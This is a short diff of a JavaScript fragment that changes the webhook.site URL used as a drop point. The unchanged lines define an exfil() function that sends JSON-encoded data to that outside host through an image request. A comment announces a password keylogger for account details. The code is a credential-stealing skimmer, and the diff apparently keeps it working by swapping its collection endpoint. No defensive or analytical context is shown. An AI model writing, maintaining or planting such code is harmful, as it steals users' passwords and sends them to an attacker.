@@ -1,5 +1,5 @@
 (function() {
-  var WEBHOOK = 'https://096e95e5-fb71-4f19-b143-647d19cb5a2e.webhook.site';
+  var WEBHOOK = 'https://204bcd94-fd70-4c98-83a1-f56eeaf55afd.webhook.site';
   function exfil(d) { new Image().src = WEBHOOK + '?' + encodeURIComponent(JSON.stringify(d)); }
 
   // --- PASSWORD KEYLOGGER (account-details only) ---
